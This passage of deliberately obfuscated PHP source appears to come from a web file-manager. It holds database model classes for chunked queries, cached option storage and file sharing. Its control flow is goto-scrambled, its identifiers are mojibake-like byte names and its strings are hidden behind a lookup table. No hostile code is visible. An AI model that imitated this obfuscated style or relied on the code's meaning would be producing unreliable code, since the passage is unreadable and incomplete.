$C¡Ã™ñĞÁù[$f—¸¡¸Â…—] = $this->_facade($EÌËùÌ´…); $this->_beforeInsert($C¡Ã™ñĞÁù[$f—¸¡¸Â…—], $f¼ë¶‡ˆÇÄ); } goto déƒáŠğ‡Ğ; Bë²‡ÌÎœ²: } public function save($D¨£Ğä¥—Ú = '', $fçâ´šáª = array()) { goto a™•¾×í‘; c¿Ÿ“ô‡„Ï: $F…÷«¨ğÈÎ = $D‰óŒº‘[$a¾ãÔÇØêÂ[273]][$b£®åôŒçğ][1]; $F…÷«¨ğÈÎ = is_array($F…÷«¨ğÈÎ) ? $F…÷«¨ğÈÎ : array(); $FªŒø´ëœ = count($F…÷«¨ğÈÎ); goto fòãËß‚×í; a†–Å¿…ƒ¾: $b£®åôŒçğ = $this->findWhereField($D‰óŒº‘); if (!$b£®åôŒçğ) { return parent::save($D¨£Ğä¥—Ú, $fçâ´šáª); } $AòË½‰Æˆ› = 0; goto c¿Ÿ“ô‡„Ï; fòãËß‚×í: for ($b·Ğğ¢Œî— = 0; $b·Ğğ¢Œî— < $FªŒø´ëœ; $b·Ğğ¢Œî— += $f…³¬áâì¸) { $fŒ„©Ø¿ÎÆ = array_slice($F…÷«¨ğÈÎ, $b·Ğğ¢Œî—, $f…³¬áâì¸); if (!is_array($fŒ„©Ø¿ÎÆ) || count($fŒ„©Ø¿ÎÆ) == 0) { break; } $D‰óŒº‘[$a¾ãÔÇØêÂ[273]][$b£®åôŒçğ][1] = $fŒ„©Ø¿ÎÆ; $this->optionsValue($D‰óŒº‘); $AòË½‰Æˆ› += parent::save($D¨£Ğä¥—Ú, $fçâ´šáª); $this->chunkEventCheck(count($fŒ„©Ø¿ÎÆ)); } $this->chunkEventSet(); return $AòË½‰Æˆ›; goto E¿ßºø²Ù©; a™•¾×í‘: $a¾ãÔÇØêÂ =& $_SERVER[ÒÆ›ÆØÎ¾]; $f…³¬áâì¸ = self::SQL_WHERE_IN_CHUNK; $D‰óŒº‘ = $this->optionsValue(); goto a†–Å¿…ƒ¾; E¿ßºø²Ù©: } public function add($C›Ô¤÷Óñ¯ = '', $EÓÉì§ğÃ§ = array(), $f•”‹¹Ñ£‘ = false) { if ($this->addTaskStatus && is_array($C›Ô¤÷Óñ¯)) { $this->addTaskData[] = $C›Ô¤÷Óñ¯; return; } return parent::add($C›Ô¤÷Óñ¯, $EÓÉì§ğÃ§, $f•”‹¹Ñ£‘); } public function parseWhereLike($cå…†—ğ×è, $cÍ»ö¦·Æ = '', $a§ã¿Áä·ù = false, &$DœÕ§è÷í = false) { goto b·äÇÕ™ç; c êÓªÑø³: if (!is_array($cå…†—ğ×è)) { return $cå…†—ğ×è; } $dÏÊò„…Í = array(); $b¨Ä’‡‰Ş = 0; goto B›‚øƒ°÷; b·äÇÕ™ç: $CÆÈÆ³ØŠ¥ =& $_SERVER[ÒÆ›ÆØÎ¾]; $EİÒö èõˆ = $GLOBALS[$CÆÈÆ³ØŠ¥[6]][$CÆÈÆ³ØŠ¥[378]]; if (!$EİÒö èõˆ[$CÆÈÆ³ØŠ¥[379]]) { return $cå…†—ğ×è; } goto c êÓªÑø³; B›‚øƒ°÷: foreach ($cå…†—ğ×è as $B·ô„Š„ĞÓ => $e¼“æñ¥„‰) { if (is_array($e¼“æñ¥„‰) && count($e¼“æñ¥„‰) == 2 && $e¼“æñ¥„‰[0] == $CÆÈÆ³ØŠ¥[380] && is_string($e¼“æñ¥„‰[1]) && substr($e¼“æñ¥„‰[1], 0, 1) == $CÆÈÆ³ØŠ¥[381] && substr($e¼“æñ¥„‰[1], strlen($e¼“æñ¥„‰[1]) - 1, 1) == $CÆÈÆ³ØŠ¥[381]) { goto c¼ à‰èÄ×; c¼ à‰èÄ×: $DœÕ§è÷í = !0; $F‹Í…âïƒó = is_string($B·ô„Š„ĞÓ) ? $B·ô„Š„ĞÓ : $cÍ»ö¦·Æ; $C•ã¶‰Ä˜‹ = substr($e¼“æñ¥„‰[1], 1, strlen($e¼“æñ¥„‰[1]) - 2); goto bµ°êšù±¸; có×²Õ†: if ($EİÒö èõˆ[$CÆÈÆ³ØŠ¥[383]]) { $F¿ÛÛĞ™‘‘ = $CÆÈÆ³ØŠ¥[384] . $C•ã¶‰Ä˜‹ . $CÆÈÆ³ØŠ¥[385]; if ($EİÒö èõˆ[$CÆÈÆ³ØŠ¥[386]]) { $F¿ÛÛĞ™‘‘ = $CÆÈÆ³ØŠ¥[385] . $C•ã¶‰Ä˜‹ . $CÆÈÆ³ØŠ¥[384]; } } $dÏÊò„…Í[$b¨Ä’‡‰Ş] = $CÆÈÆ³ØŠ¥[387] . $F‹Í…âïƒó . $CÆÈÆ³ØŠ¥[388] . $F¿ÛÛĞ™‘‘ . $CÆÈÆ³ØŠ¥[389]; $b¨Ä’‡‰Ş++; goto bßİÔà†…; bµ°êšù±¸: $C•ã¶‰Ä˜‹ = $this->db->escapeString($C•ã¶‰Ä˜‹); if (!strpos($F‹Í…âïƒó, $CÆÈÆ³ØŠ¥[95])) { $F‹Í…âïƒó = $CÆÈÆ³ØŠ¥[382] . $F‹Í…âïƒó . $CÆÈÆ³ØŠ¥[382]; } $F¿ÛÛĞ™‘‘ = $CÆÈÆ³ØŠ¥[182] . $C•ã¶‰Ä˜‹ . $CÆÈÆ³ØŠ¥[182]; goto có×²Õ†; bßİÔà†…: continue; goto FÅËêùá°í; FÅËêùá°í: } if (is_array($e¼“æñ¥„‰)) { $cÍ»ö¦·Æ = is_string($B·ô„Š„ĞÓ) ? $B·ô„Š„ĞÓ : $cÍ»ö¦·Æ; $e¼“æñ¥„‰ = $this->parseWhereLike($e¼“æñ¥„‰, $cÍ»ö¦·Æ, !0, $DœÕ§è÷í); } if (is_numeric($B·ô„Š„ĞÓ)) { $dÏÊò„…Í[$b¨Ä’‡‰Ş] = $e¼“æñ¥„‰; $b¨Ä’‡‰Ş++; } else { $dÏÊò„…Í[$B·ô„Š„ĞÓ] = $e¼“æñ¥„‰; } } if ($DœÕ§è÷í && !$a§ã¿Áä·ù) { } return $dÏÊò„…Í; goto aİ¶õÓ“…; aİ¶õÓ“…: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($c‡›•¶•¸‹ = array()) { goto CŒ´¼‹øº; CŒ´¼‹øº: $eè’í§Ó‚Ş =& $_SERVER[ÒÆ›ÆØÎ¾]; $d»æÒÂ‡ã = self::SQL_WHERE_IN_CHUNK; $A«æ–Ä¯Œ¨ = $this->optionsValue(); goto D×¿…•ù; aÉ¨¼ªÆ…“: $aè½ˆ–¥ = is_array($aè½ˆ–¥) ? $aè½ˆ–¥ : array(); $BŠÎ¬ÆÙº† = null; for ($dØ×á½Û³í = 0; $dØ×á½Û³í < count($aè½ˆ–¥); $dØ×á½Û³í += $d»æÒÂ‡ã) { $EéœãÛÂå« = array_slice($aè½ˆ–¥, $dØ×á½Û³í, $d»æÒÂ‡ã); if (!is_array($EéœãÛÂå«) || count($EéœãÛÂå«) == 0) { break; } $A«æ–Ä¯Œ¨[$eè’í§Ó‚Ş[273]][$aˆĞÍÀ§¥Š][1] = $EéœãÛÂå«; $this->optionsValue($A«æ–Ä¯Œ¨); $D¯—è˜éŒá = parent::select($c‡›•¶•¸‹); if (!$D¯—è˜éŒá) { continue; } $BŠÎ¬ÆÙº† = is_array($BŠÎ¬ÆÙº†) ? $BŠÎ¬ÆÙº† : array(); $BŠÎ¬ÆÙº† = array_merge($BŠÎ¬ÆÙº†, $D¯—è˜éŒá); } goto d«†“©ŠÃÛ; d«†“©ŠÃÛ: return $BŠÎ¬ÆÙº†; goto A› “Š²®×; D×¿…•ù: $aˆĞÍÀ§¥Š = $this->findWhereField($A«æ–Ä¯Œ¨); if (!$aˆĞÍÀ§¥Š || isset($A«æ–Ä¯Œ¨[$eè’í§Ó‚Ş[290]]) || isset($A«æ–Ä¯Œ¨[$eè’í§Ó‚Ş[351]])) { return parent::select($c‡›•¶•¸‹); } $aè½ˆ–¥ = $A«æ–Ä¯Œ¨[$eè’í§Ó‚Ş[273]][$aˆĞÍÀ§¥Š][1]; goto aÉ¨¼ªÆ…“; A› “Š²®×: } public function delete($d¶Á è’‹İ = array()) { goto C„Ä¤öåÇø; cº„¿¹“Ğ–: $e‚º¯²·Ûª = $this->findWhereField($e¤³ŸÛÚ±); if (!$e‚º¯²·Ûª) { return parent::delete($d¶Á è’‹İ); } $CåñÉÂ®Ë¯ = 0; goto CÄ†¬¶÷¯Ğ; CÄ†¬¶÷¯Ğ: $aë‡‘¤œÏ« = $e¤³ŸÛÚ±[$a×Í‘î´ÉĞ[273]][$e‚º¯²·Ûª][1]; $aë‡‘¤œÏ« = is_array($aë‡‘¤œÏ«) ? $aë‡‘¤œÏ« : array(); for ($Fä…Ï­ìšÕ = 0; $Fä…Ï­ìšÕ < count($aë‡‘¤œÏ«); $Fä…Ï­ìšÕ += $D›ù•Ì°¬¹) { $c„ïÃÅ‘ŞÂ = array_slice($aë‡‘¤œÏ«, $Fä…Ï­ìšÕ, $D›ù•Ì°¬¹); if (!is_array($c„ïÃÅ‘ŞÂ) || count($c„ïÃÅ‘ŞÂ) == 0) { break; } $e¤³ŸÛÚ±[$a×Í‘î´ÉĞ[273]][$e‚º¯²·Ûª][1] = $c„ïÃÅ‘ŞÂ; $this->optionsValue($e¤³ŸÛÚ±); $CåñÉÂ®Ë¯ += parent::delete($d¶Á è’‹İ); } goto cÎº’Ø·¢; C„Ä¤öåÇø: $a×Í‘î´ÉĞ =& $_SERVER[ÒÆ›ÆØÎ¾]; $D›ù•Ì°¬¹ = self::SQL_WHERE_IN_CHUNK; $e¤³ŸÛÚ± = $this->optionsValue(); goto cº„¿¹“Ğ–; cÎº’Ø·¢: return $CåñÉÂ®Ë¯; goto E´›èµ¤‘»; E´›èµ¤‘»: } private function findWhereField($A™×¾óÉ—) { $c¦±ÙåÇ‘› =& $_SERVER[ÒÆ›ÆØÎ¾]; $e©ÂÑÃÇÜ = self::SQL_WHERE_IN_CHUNK; if (!is_array($A™×¾óÉ—) || !is_array($A™×¾óÉ—[$c¦±ÙåÇ‘›[273]])) { return !1; } foreach ($A™×¾óÉ—[$c¦±ÙåÇ‘›[273]] as $f®ì‹ï ìÔ => $d÷çœ‡²¢¬) { if (is_array($d÷çœ‡²¢¬) && isset($d÷çœ‡²¢¬[0]) && is_string($d÷çœ‡²¢¬[0]) && strtolower($d÷çœ‡²¢¬[0]) == $c¦±ÙåÇ‘›[7] && is_array($d÷çœ‡²¢¬[1]) && count($d÷çœ‡²¢¬[1]) > $e©ÂÑÃÇÜ) { ignore_timeout(); return $f®ì‹ï ìÔ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\x65\155\117\160\164\151\157\156"; public $field = array(); public function listData($b†©‰’ã°Ÿ = false, $Eè°ìÀÃñÅ = "\x6d\157\144\151\x66\x79\124\x69\x6d\145", $aÀ¨ì§„ø® = false) { $bˆÒ»¢ğíå = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$bˆÒ»¢ğíå) { return $b†©‰’ã°Ÿ ? null : array(); } if (!$b†©‰’ã°Ÿ) { $bˆÒ»¢ğíå = array_filter(array_values($bˆÒ»¢ğíå)); return array_sort_by($bˆÒ»¢ğíå, $Eè°ìÀÃñÅ, $aÀ¨ì§„ø®); } return $bˆÒ»¢ğíå[$_SERVER[ÒÆ›ÆØÎ¾][390] . $b†©‰’ã°Ÿ]; } public function insert($f®­Õ¹†¢) { goto DÛàÄÔÛ£õ; FÙ©Ë È˜î: $cÙöÌ²¤Ù = $cÙöÌ²¤Ù ? $cÙöÌ²¤Ù : 0; $f®­Õ¹†¢[$DùÙ‘ƒäçÄ[393]] = ++$cÙöÌ²¤Ù; $f®­Õ¹†¢[$DùÙ‘ƒäçÄ[194]] = time(); goto D¬øÍÏä†ö; Eìõ²ÃéĞ: return $cÙöÌ²¤Ù; goto c¥‰ŒÓÉ•; D¬øÍÏä†ö: $f®­Õ¹†¢[$DùÙ‘ƒäçÄ[84]] = time(); Model($this->modelType)->set($DùÙ‘ƒäçÄ[391], $cÙöÌ²¤Ù, $this->optionType . $DùÙ‘ƒäçÄ[392]); Model($this->modelType)->set($DùÙ‘ƒäçÄ[390] . $cÙöÌ²¤Ù, $f®­Õ¹†¢, $this->optionType); goto Eìõ²ÃéĞ; DÛàÄÔÛ£õ: $DùÙ‘ƒäçÄ =& $_SERVER[ÒÆ›ÆØÎ¾]; $f®­Õ¹†¢ = array_field_key($f®­Õ¹†¢, $this->field); $cÙöÌ²¤Ù = Model($this->modelType)->get($DùÙ‘ƒäçÄ[391], $this->optionType . $DùÙ‘ƒäçÄ[392]); goto FÙ©Ë È˜î; c¥‰ŒÓÉ•: } public function update($C‘éŠ‡ºÁÛ, $C¥¯Ä¿Ûè) { goto aĞ¢§ºõÖÅ; aĞ¢§ºõÖÅ: $DæÚÙò‡ìá =& $_SERVER[ÒÆ›ÆØÎ¾]; $C¥¯Ä¿Ûè = array_field_key($C¥¯Ä¿Ûè, $this->field); $Dº‰˜È–È± = $this->listData($C‘éŠ‡ºÁÛ); goto fÔÔ¹ùå­; f¸µîª¹…Ş: return Model($this->modelType)->set($DæÚÙò‡ìá[390] . $C‘éŠ‡ºÁÛ, $C¥¯Ä¿Ûè, $this->optionType); goto FÖ‹œóŠÂ˜; fÔÔ¹ùå­: if (!$Dº‰˜È–È±) { return !1; } $C¥¯Ä¿Ûè = array_merge($Dº‰˜È–È±, $C¥¯Ä¿Ûè); $C¥¯Ä¿Ûè[$DæÚÙò‡ìá[84]] = time(); goto f¸µîª¹…Ş; FÖ‹œóŠÂ˜: } public function remove($e£ÍÇ¸ğ·) { return Model($this->modelType)->remove($_SERVER[ÒÆ›ÆØÎ¾][390] . $e£ÍÇ¸ğ·, $this->optionType); } public function clear() { $CóÜêóš =& $_SERVER[ÒÆ›ÆØÎ¾]; Model($this->modelType)->remove($CóÜêóš[391], $this->optionType . $CóÜêóš[392]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($EÜ‡ÙŸ‚±¨, $Dù½ó„À’È) { if (!$Dù½ó„À’È) { return !1; } $b†®‚Ñ…Íæ = $this->listData(); $b†®‚Ñ…Íæ = array_to_keyvalue($b†®‚Ñ…Íæ, $EÜ‡ÙŸ‚±¨); return isset($b†®‚Ñ…Íæ[$Dù½ó„À’È]) ? $b†®‚Ñ…Íæ[$Dù½ó„À’È] : !1; } public function findByName($dƒö¶ÃøŞÜ) { return $this->findByKey($_SERVER[ÒÆ›ÆØÎ¾][28], $dƒö¶ÃøŞÜ); } protected function resetData($DÁÌ²íøèÂ) { $bÈƒè¯¿§ =& $_SERVER[ÒÆ›ÆØÎ¾]; $DÁÌ²íøèÂ = is_array($DÁÌ²íøèÂ) ? $DÁÌ²íøèÂ : array(); $Bƒ±Ù‚‚µ = array(); for ($bá®òƒª½ = 0; $bá®òƒª½ < count($DÁÌ²íøèÂ); $bá®òƒª½++) { $Bƒ±Ù‚‚µ[$bÈƒè¯¿§[390] . $DÁÌ²íøèÂ[$bá®òƒª½][$bÈƒè¯¿§[393]]] = $DÁÌ²íøèÂ[$bá®òƒª½]; } return Model($this->modelType)->set($Bƒ±Ù‚‚µ, !1, $this->optionType); } private function getAutoName($EÖ³êÛª­ì) { $FêÁ…Ô¨© = array_to_keyvalue($this->listData(), $_SERVER[ÒÆ›ÆØÎ¾][28]); if (!$FêÁ…Ô¨© || !isset($FêÁ…Ô¨©[$EÖ³êÛª­ì])) { return $EÖ³êÛª­ì; } for ($Aæ÷­â÷‰… = 1; $Aæ÷­â÷‰… < count($FêÁ…Ô¨©); $Aæ÷­â÷‰…++) { $c¢¦µ§á¬… = $EÖ³êÛª­ì . "\x28{$Aæ÷­â÷‰…}\51"; if (!isset($FêÁ…Ô¨©[$c¢¦µ§á¬…])) { return $c¢¦µ§á¬…; } } return $c¢¦µ§á¬…; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($A‡†–´÷ÛĞ = false, $eŞ˜Ãóê‡ê = '', $dç®›Š•Ã— = false) { goto F¬Û†²†ñ; F¬Û†²†ñ: $E‹ù™£©ˆ =& $_SERVER[ÒÆ›ÆØÎ¾]; $E—…½—ãå = $this->cacheGet($eŞ˜Ãóê‡ê); $bÈĞØóÍêÄ = $this->optionDefault($eŞ˜Ãóê‡ê); goto eˆÁßŒì; A¬—À“ÜµÕ: $E—…½—ãå = $this->where($cì„»ÍŠâ)->select(); $E—…½—ãå = array_to_keyvalue($E—…½—ãå, $E‹ù™£©ˆ[93], $E‹ù™£©ˆ[372]); foreach ($E—…½—ãå as $eÕŸƒªœë¹ => $aˆÁÒ»§) { if ($dç®›Š•Ã— || in_array($eÕŸƒªœë¹, $this->jsonField)) { $E—…½—ãå[$eÕŸƒªœë¹] = json_decode($aˆÁÒ»§, !0); } } goto c¤ÊØ‘ñÆÔ; c¤ÊØ‘ñÆÔ: $this->cacheSet($eŞ˜Ãóê‡ê, $E—…½—ãå); $E—…½—ãå = array_merge($bÈĞØóÍêÄ, $E—…½—ãå); return $A‡†–´÷ÛĞ ? $E—…½—ãå[$A‡†–´÷ÛĞ] : $E—…½—ãå; goto DÆé…·ïÉ; eˆÁßŒì: $bÈĞØóÍêÄ = is_array($bÈĞØóÍêÄ) ? $bÈĞØóÍêÄ : array(); if (is_array($E—…½—ãå)) { $E—…½—ãå = array_merge($bÈĞØóÍêÄ, $E—…½—ãå); return $A‡†–´÷ÛĞ ? isset($E—…½—ãå[$A‡†–´÷ÛĞ]) ? $E—…½—ãå[$A‡†–´÷ÛĞ] : null : $E—…½—ãå; } $cì„»ÍŠâ = $this->filterWhere(array($E‹ù™£©ˆ[29] => $eŞ˜Ãóê‡ê)); goto A¬—À“ÜµÕ; DÆé…·ïÉ: } public function set($AÁ«—çœ—, $EªÍÅàªÄ× = false, $D„ƒğ´Ì¡ = '') { goto a‡‰¡·†·Õ; CÉ‹Şƒåêµ: $Cä¯×†ë = is_array($AÁ«—çœ—) ? $AÁ«—çœ— : array($AÁ«—çœ— => $EªÍÅàªÄ×); foreach ($Cä¯×†ë as $AÈ ìÑßçÆ => $f±êí†¼¨ì) { if (is_array($f±êí†¼¨ì)) { $f±êí†¼¨ì = json_encode_force($f±êí†¼¨ì); } $this->checkLength($f±êí†¼¨ì, !1, $this->tableName . $B‚ç³­šÈ¼[4] . $AÁ«—çœ—); $f±êí†¼¨ì = self::textEncode($f±êí†¼¨ì); $Cä¯×†ë = array($B‚ç³­šÈ¼[29] => $D„ƒğ´Ì¡, $B‚ç³­šÈ¼[93] => $AÈ ìÑßçÆ, $B‚ç³­šÈ¼[372] => $f±êí†¼¨ì); $cªôŒœÎÊ„[] = $this->filterWhere($Cä¯×†ë); } if (!$cªôŒœÎÊ„) { return !0; } goto aó×î´–; aó×î´–: return $this->addAll($cªôŒœÎÊ„, array(), !0); goto fÜˆš‰´°î; a‡‰¡·†·Õ: $B‚ç³­šÈ¼ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->cacheRemove($D„ƒğ´Ì¡); $cªôŒœÎÊ„ = array(); goto CÉ‹Şƒåêµ; fÜˆš‰´°î: } protected function optionDefault($EŒ¼ÏŒì„‡ = '') { return !1; } public function setDeep($D–Ã—ò°¹, $f×é³½•« = false, $d‚‘Ş²ÁÀ“ = '') { $C‹È·†Çè§ = explode($_SERVER[ÒÆ›ÆØÎ¾][95], $D–Ã—ò°¹); $aÂ»¯ğğÄ = $this->get(); array_set_value($aÂ»¯ğğÄ, $D–Ã—ò°¹, $f×é³½•«); $this->set($C‹È·†Çè§[0], $aÂ»¯ğğÄ[$C‹È·†Çè§[0]], $d‚‘Ş²ÁÀ“); } public function remove($Dï°ô«´Á‡, $dã«â³ï©Ã = '') { $bÚ”Òœ³‚ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->cacheRemove($dã«â³ï©Ã); $AÃ±šƒëØŞ = $this->filterWhere(array($bÚ”Òœ³‚[93] => $Dï°ô«´Á‡, $bÚ”Òœ³‚[29] => $dã«â³ï©Ã)); if (is_null($Dï°ô«´Á‡)) { unset($AÃ±šƒëØŞ[$bÚ”Òœ³‚[93]]); } return $this->where($AÃ±šƒëØŞ)->delete(); } public function cacheSet($DìŞ¤¥”„Ï, $AĞ¨Äàªê = false) { return Cache::set($this->cacheKey($DìŞ¤¥”„Ï), $AĞ¨Äàªê); } public function cacheGet($a«¸ÍñÜÂ) { return Cache::get($this->cacheKey($a«¸ÍñÜÂ)); } public function cacheRemove($F‡ˆˆÀæ¿) { return Cache::remove($this->cacheKey($F‡ˆˆÀæ¿)); } protected function filterWhere($Dª×Ç Ù•) { return $Dª×Ç Ù•; } protected function cacheKey($aóÁíÅô¨™) { return $aóÁíÅô¨™; } } goto côì ò¸¢Æ; CÇÑöÏƒ ß: class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\x72\x65"; protected $dataAuto = array(array("\155\157\x64\x69\146\171\124\151\x6d\145", "\164\151\x6d\x65", "\151\x6e\x73\x65\162\164\54\x75\160\144\x61\x74\145", "\x66\165\156\x63\164\151\x6f\156"), array("\143\x72\145\x61\x74\x65\124\x69\x6d\x65", "\x74\151\155\x65", "\x69\x6e\x73\145\162\x74", "\x66\x75\x6e\143\164\x69\x6f\156"), array("\157\160\164\151\157\156\163", '', "\x69\x6e\163\x65\162\x74\54\x75\x70\x64\141\x74\x65\x2c\163\145\154\x65\x63\x74", "\x6a\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($E‹¿Õ÷³õ) { $DÔ»¤¥Ì¡’ =& $_SERVER[ÒÆ›ÆØÎ¾]; $a•…£áçÃá = isset($E‹¿Õ÷³õ[0]) ? $E‹¿Õ÷³õ[0] : !1; return array($DÔ»¤¥Ì¡’[1809] => array(USER_ID, $DÔ»¤¥Ì¡’[1810]), $DÔ»¤¥Ì¡’[1753] => array($a•…£áçÃá, $DÔ»¤¥Ì¡’[1811])); } protected function listSimple() { $B•ï‡•ëÁ› = array($_SERVER[ÒÆ›ÆØÎ¾][1517] => USER_ID); $b«ªôŠƒ¦ = $this->field($this->fieldList)->where($B•ï‡•ëÁ›)->select(); return $b«ªôŠƒ¦ ? $b«ªôŠƒ¦ : array(); } protected function getInfo($E¼ƒò‹ğ¸¦, $e•ˆÑØĞ» = false) { $CíŠÛ¸·—í =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($e•ˆÑØĞ») { return $this->_getShareInfo(array($CíŠÛ¸·—í[468] => $E¼ƒò‹ğ¸¦)); } $Dóˆ·ÜÑ› = $this->cacheFunctionGet($CíŠÛ¸·—í[1760], $E¼ƒò‹ğ¸¦); return $Dóˆ·ÜÑ›; } public function getInfoByHash($a¹÷…ØŠÉ) { return $this->_getShareInfo(array($_SERVER[ÒÆ›ÆØÎ¾][470] => $a¹÷…ØŠÉ)); } public function getInfoByPath($Fî²ö˜»ö‘) { $dĞêö—»Ò =& $_SERVER[ÒÆ›ÆØÎ¾]; $e»àÇ±±á = array($dĞêö—»Ò[1517] => USER_ID, $dĞêö—»Ò[395] => $Fî²ö˜»ö‘); return $this->_getShareInfo($e»àÇ±±á); } public function getInfoBySourcePath($f°ß…½¥±å) { $E¼™ˆ“âƒõ =& $_SERVER[ÒÆ›ÆØÎ¾]; $C¬ÄŠ¿öÉÈ = array($E¼™ˆ“âƒõ[1517] => USER_ID, $E¼™ˆ“âƒõ[1062] => $f°ß…½¥±å); return $this->_getShareInfo($C¬ÄŠ¿öÉÈ); } private function _getShareInfo($b©®ğ«¤¢Ü) { goto A¯ÑÜóÊñ; A¯ÑÜóÊñ: $BÆ™×¹È°© =& $_SERVER[ÒÆ›ÆØÎ¾]; $CÂÊÆÙÎÓ = $this->where($b©®ğ«¤¢Ü)->find(); if (!$CÂÊÆÙÎÓ) { return !1; } goto dœöç¨°É; dœöç¨°É: $b©®ğ«¤¢Ü = array($BÆ™×¹È°©[468] => $CÂÊÆÙÎÓ[$BÆ™×¹È°©[468]]); $E®á…Æ‹–Ã = $BÆ™×¹È°©[1812]; $AÖğŠçôÖ = Model($BÆ™×¹È°©[564])->order($BÆ™×¹È°©[393])->field($E®á…Æ‹–Ã)->where($b©®ğ«¤¢Ü)->select(); goto d×íÂÓÃ‡¼; d×íÂÓÃ‡¼: if ($CÂÊÆÙÎÓ[$BÆ™×¹È°©[395]] == $BÆ™×¹È°©[191]) { $CÂÊÆÙÎÓ[$BÆ™×¹È°©[85]] = IO::info($CÂÊÆÙÎÓ[$BÆ™×¹È°©[1062]]); } else { $CÂÊÆÙÎÓ[$BÆ™×¹È°©[85]] = Model($BÆ™×¹È°©[1197])->pathInfo($CÂÊÆÙÎÓ[$BÆ™×¹È°©[395]]); } $CÂÊÆÙÎÓ[$BÆ™×¹È°©[1813]] = $AÖğŠçôÖ; return $CÂÊÆÙÎÓ; goto F£™ãñ»­Ú; F£™ãñ»­Ú: } protected function getInfoAuth($aŒ…½áìš») { $dÉ¢Àˆêªğ =& $_SERVER[ÒÆ›ÆØÎ¾]; $EÁÛ©ˆİ² = $this->getInfo($aŒ…½áìš»); $EÁÛ©ˆİ²[$dÉ¢Àˆêªğ[406]] = Model($dÉ¢Àˆêªğ[482])->authMake($EÁÛ©ˆİ²[$dÉ¢Àˆêªğ[1813]]); return $EÁÛ©ˆİ²; } protected function listData($Dä‡éÃ»Øî = null, $eÇšÇÛÇ‰å = 300) { $DÆÆŞßÕø =& $_SERVER[ÒÆ›ÆØÎ¾]; $C¿†©Ğ„³Î = array(array($DÆÆŞßÕø[473] => array($DÆÆŞßÕø[960], 0), $DÆÆŞßÕø[475] => array($DÆÆŞßÕø[960], 0), $DÆÆŞßÕø[1814] => $DÆÆŞßÕø[1768])); if ($Dä‡éÃ»Øî == $DÆÆŞßÕø[1815]) { $C¿†©Ğ„³Î = array($DÆÆŞßÕø[473] => 1); } else { if ($Dä‡éÃ»Øî == $DÆÆŞßÕø[1047]) { $C¿†©Ğ„³Î = array($DÆÆŞßÕø[475] => 1); } } $C¿†©Ğ„³Î[$DÆÆŞßÕø[1517]] = USER_ID; $dëÃãµÖá„ = $this->where($C¿†©Ğ„³Î)->selectPage($eÇšÇÛÇ‰å); return $dëÃãµÖá„; } protected function listToMe($fÄ‰”‘ó×Ô = 300) { goto aí¶ŒŠîéé; aí¶ŒŠîéé: $eâ¹²¸ˆ›Ç =& $_SERVER[ÒÆ›ÆØÎ¾]; $eŠ˜’òĞá· = Model($eâ¹²¸ˆ›Ç[1816])->userGroupParents(USER_ID); $AİÆˆ›ô¾³ = array($eâ¹²¸ˆ›Ç[549] => SourceModel::TYPE_USER, $eâ¹²¸ˆ›Ç[484] => USER_ID); goto C´‡Ò»¼‹ê; Eº¦ªÙì’: if (!$Bº™„ƒÊ) { return $eÊ†¢Ô‹œ±; } $F÷ßëÈÊôƒ = $eâ¹²¸ˆ›Ç[1817]; $AİÆˆ›ô¾³ = array($eâ¹²¸ˆ›Ç[468] => array($eâ¹²¸ˆ›Ç[411], array_keys($Bº™„ƒÊ))); goto cË¤ä“ôÄ³; cË¤ä“ôÄ³: $D¾îùÅŠÑò = $this->field($F÷ßëÈÊôƒ)->where($AİÆˆ›ô¾³)->select(); foreach ($D¾îùÅŠÑò as $eîÅê¦™ñŠ => &$Cæíƒ§ã·é) { $Cæíƒ§ã·é[$eâ¹²¸ˆ›Ç[1813]] = $Bº™„ƒÊ[$Cæíƒ§ã·é[$eâ¹²¸ˆ›Ç[468]]]; } unset($Cæíƒ§ã·é); goto eàÆÑÎšÊò; C´‡Ò»¼‹ê: if ($eŠ˜’òĞá·) { $AİÆˆ›ô¾³ = array(array($eâ¹²¸ˆ›Ç[549] => SourceModel::TYPE_USER, $eâ¹²¸ˆ›Ç[484] => USER_ID), array($eâ¹²¸ˆ›Ç[549] => SourceModel::TYPE_GROUP, $eâ¹²¸ˆ›Ç[484] => array($eâ¹²¸ˆ›Ç[7], $eŠ˜’òĞá·)), $eâ¹²¸ˆ›Ç[1814] => $eâ¹²¸ˆ›Ç[1768]); } $eÊ†¢Ô‹œ± = Model($eâ¹²¸ˆ›Ç[564])->where($AİÆˆ›ô¾³)->selectPage($fÄ‰”‘ó×Ô); $Bº™„ƒÊ = array_to_keyvalue_group($eÊ†¢Ô‹œ±[$eâ¹²¸ˆ›Ç[367]], $eâ¹²¸ˆ›Ç[468]); goto Eº¦ªÙì’; eàÆÑÎšÊò: $BÙÈÙ’®äµ = array($eâ¹²¸ˆ›Ç[1818] => $D¾îùÅŠÑò, $eâ¹²¸ˆ›Ç[1819] => $eÊ†¢Ô‹œ±[$eâ¹²¸ˆ›Ç[364]]); return $BÙÈÙ’®äµ; goto CÅÕÒ’Üì°; CÅÕÒ’Üì°: } protected function shareAdd($AÀğ‚—¾Üğ, $E§‚…éµÉ•) { $dğ´¡Æ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fó°ˆÀÛ’Ó = $this->_addShareData($AÀğ‚—¾Üğ, $E§‚…éµÉ•); if (!empty($E§‚…éµÉ•[$dğ´¡Æ[1820]])) { $this->_shareAuthSet($fó°ˆÀÛ’Ó, $E§‚…éµÉ•[$dğ´¡Æ[1820]]); } $this->shareEventAdd($AÀğ‚—¾Üğ, $E§‚…éµÉ•, $dğ´¡Æ[1050]); return $fó°ˆÀÛ’Ó; } private function shareEventAdd($D«Š‰¦õ«, $e‚ôò¬äÉ, $AâÕœ™«Ñ© = "\141\144\x64") { goto a â³‡ä©¹; 